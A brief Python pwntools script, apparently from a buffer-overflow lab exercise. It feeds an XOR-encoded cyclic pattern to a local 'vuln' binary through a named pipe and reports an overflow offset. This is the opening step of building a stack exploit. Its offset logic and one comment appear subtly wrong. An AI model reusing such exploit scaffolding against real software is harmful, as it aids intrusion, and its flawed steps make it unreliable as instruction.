#!/usr/bin/python

from pwn import *
import posix
import os

def main():

	# Get absolute path to vuln 
	vuln_path = os.path.abspath("./vuln")
	log.info("Absolute path: %s" % vuln_path)
	
	# Change working dir to tmp and create a named pipe badfile.
	# This is to avoid problems with the shared directory in vagrant
	os.chdir("/tmp")
	log.info("Changed dir to /tmp")

	# Create named pipe to interact realiably with binary
	np = "badfile" # np - named pipe
	try: # The try block lets you test a block of code for errors.
		os.unlink(np)
	except: # The except block lets you handle the error.
		pass
	os.mkfifo(np) # Creates the named pipe
	
	# Starts process:
	# Once at /tmp , program will remain open until it receives an input
	p = process(vuln_path)
	
	# Open a handle to the `input` named pipe
	comm = open(np, 'w', 0) # `w` : writing ,  `0` : stdin
	
	# Craft payload
	xor_str = 0xBE
	payload = cyclic(128) # Create a 128 byte long brujin sequence
	payload = xor(payload, xor_str)	

	log.info("Payload : %s" % payload)
	
	comm.write(payload) # Writes to the named pipe	
	
	offset = cyclic_find(0x61616167) # Finds the offset
	log.success("Offset : %d" % offset)
	
	# Pass control of program back to user
	p.interactive()

if __name__ == "__main__":
	main()
